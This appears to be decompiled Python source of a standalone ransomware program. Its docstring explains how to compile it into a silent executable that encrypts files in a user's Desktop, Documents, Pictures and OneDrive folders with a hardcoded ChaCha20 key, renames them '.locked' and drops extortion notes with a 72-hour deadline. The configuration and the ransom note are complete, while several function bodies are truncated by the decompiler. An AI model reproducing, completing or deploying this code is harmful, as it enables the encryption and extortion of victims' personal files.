# NOTE: pycdc incomplete on Python 3.12 opcodes — use ransom_reconstructed.py for full logic.
# Source Generated with Decompyle++
# File: ransom.pyc (Python 3.12)

__doc__ = '\nransom.py - Standalone ransomware with hardcoded encryption key.\n\nCompile to .exe:  pyinstaller --onefile --noconsole ransom.py\nThen just run the .exe — it does everything automatically.\n\nFeatures:\n    - Hardcoded ChaCha20 encryption key (change ENCRYPTION_KEY below)\n    - Auto-scans common user directories on execution\n    - Skips executables, system files, already-encrypted files, and its own note\n    - Drops HOW_TO_DECRYPT.txt ransom notes in every directory\n    - Logs activity to %APPDATA%\\ransom.log\n'
import os
import sys
import base64
import logging
from pathlib import Path
from Crypto.Cipher import ChaCha20
ENCRYPTION_KEY = b'X7k9mP2vQ8wR4tY6uI0oA3sD5fG7hJ1lZxCvBnMqWeRs'
FILE_EXTENSION = '.locked'
RANSOM_NOTE_NAME = 'HOW_TO_DECRYPT.txt'
LOG_FILE = os.path.join(os.getenv('APPDATA', ''), 'ransom.log')
SCAN_DIRS = [
    'Desktop',
    'Documents',
    'Downloads',
    'Pictures',
    'Music',
    'Videos',
    'OneDrive\\Desktop',
    'OneDrive\\Documents',
    'OneDrive\\Pictures']
SKIP_NAMES = {
    RANSOM_NOTE_NAME}
SKIP_SUFFIXES = {
    '.dll',
    '.exe',
    '.log',
    '.pyc',
    '.sys',
    '.locked'}
logging.basicConfig(filename = LOG_FILE, level = logging.INFO, format = '%(asctime)s %(message)s')

def encrypt_file(file_path = None):
    '''Encrypt a single file in-place and rename it with FILE_EXTENSION.'''
    cipher = ChaCha20.new(key = ENCRYPTION_KEY)
# WARNING: Decompyle incomplete


def decrypt_file(file_path = None):
    '''Decrypt a file encrypted by this script.'''
    pass
# WARNING: Decompyle incomplete


def collect_files(target_dir = None):
    '''Collect eligible files under *target_dir*.'''
    pass
# WARNING: Decompyle incomplete


def write_ransom_notes(target_dir = None):
    '''Drop a HOW_TO_DECRYPT.txt in every directory under *target_dir*.'''
    key_b64 = base64.b64encode(ENCRYPTION_KEY).decode()
    note_content = f'''\n============================================\n       YOUR FILES HAVE BEEN ENCRYPTED!\n============================================\n\nAll files in this directory (and subdirectories) have been encrypted.\n\nTo decrypt your files you need the encryption key:\n\n    {key_b64}\n\nIf you deleted or lost the key, your files are gone forever.\nYou have 72 hours — after that the key will be destroyed!\n\nContact: decrypt@ransomware.example.com\n============================================\n'''
# WARNING: Decompyle incomplete


def run_ransom():
    '''Encrypt files in all configured directories.'''
    home = Path.home()
# WARNING: Decompyle incomplete

if __name__ == '__main__':
    run_ransom()
    return None
return None
# WARNING: Decompyle incomplete
